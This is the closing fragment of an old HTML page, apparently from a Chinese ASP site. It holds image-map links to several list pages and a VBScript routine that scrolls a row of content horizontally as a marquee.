  <area shape="rect" coords="47,2,125,24" href="chuangyelist.asp" target="_blank">
</map>
<map name="Map8">
  <area shape="rect" coords="48,2,127,27" href="xuetanglist.asp" target="_blank">
</map>
<map name="Map9">
  <area shape="rect" coords="46,2,127,26" href="daikuanlist.asp" target="_blank">
</map>
<map name="Map10">
  <area shape="rect" coords="32,3,111,22" href="zhuangshilist.asp" target="_blank">
</map>
</body>
<script language="vbscript">
pp=demo.offsetwidth
ll=778
jj=demo3.innerhtml
demo.innerhtml="<table border='0' cellspacing='0' cellpadding='0'><tr id='demo3'>" & jj & jj & "</tr></table>"
demo.style.width=ll
function eee()
if demo.scrollleft>=pp then
demo.scrollleft=0
end if
demo.scrollleft=demo.scrollleft+1
end function
ll=setInterval("eee()",30)
function a1()
ll=setInterval("eee()",30)
end function
function a2()
clearInterval ll
end function
</script>
</html>

